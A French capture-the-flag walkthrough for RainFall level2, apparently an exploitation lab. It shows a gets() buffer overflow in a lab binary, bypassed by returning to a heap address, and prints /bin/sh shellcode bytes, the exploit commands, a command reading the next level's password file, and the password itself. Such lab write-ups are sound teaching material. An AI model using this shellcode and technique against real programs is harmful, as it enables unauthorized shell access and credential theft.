Etape 1 : Un binaire *level2* est présent dans le dossier, par habitude on l'éxécute et celui-ci ouvre une entrée sur la sortie standard. En écrivant n'importe quoi le texte se répète. On peut donc supposer qu'il s'agit d'un programme qui lit sur l'entrée standard et écrit sur la sortie standard.
```bash
level2@RainFall:~$ ./level2
fjsdkfhjkaf
fjsdkfhjkaf
```

Etape 2 : On ouvre le binaire avec *ghidra* pour voir ce qu'il se passe. On peut voir que le programme utilise la fonction *gets* pour lire sur l'entrée standard. Cette fonction est vulnérable à un *buffer overflow*.
voir source.c

Etape 3 : On voit 2 problèmes dans le code. le premier est pas d'appel au /bin/sh et le deuxieme est un if apres le gets qui exit le progamme si l'adresse se trouve sur les adresses 0xb...... (donc sur la stack). On va donc devoir trouver une adresse qui ne se trouve pas sur la stack pour pouvoir executer notre shellcode.

Etape 4 : Pour le /bin/sh on peux contourner le probleme passant par un shellcode : ici nous avons choisi le suivant : "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" qui est un shellcode qui execute /bin/sh.
https://shell-storm.org/shellcode/files/shellcode-575.html

Et pour l'adresse on voit la fonction strdup qui stock la memoire avec malloc dans la heap 
on va utiliser gdb pour trouver une adresse qui ne se trouve pas sur la stack. On va donc lancer le programme et regarder l'adresse de la fonction main. On va ensuite utiliser cette adresse pour executer notre shellcode.

```bash
(gdb) b* 0x0804853d #adress de strdup
Breakpoint 1 at 0x804853d
(gdb) run
Starting program: /home/user/level2/level2
x $eax
x $eax

Breakpoint 1, 0x0804853d in p ()
(gdb) x $eax


0x804a008:    0x65242078
```

Etape 5 : On va donc executer notre shellcode en utilisant l'adresse 0x804a008
pour cela nous allons utiliser le script trouver dans le dossier ressources.

Etape 6: On va donc executer les commandes suivantes pour obtenir le flag
```bash
level2@RainFall:~$ python /tmp/attack.py > /tmp/exploit.txt
level2@RainFall:~$ cat /tmp/exploit.txt - | ./level2
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
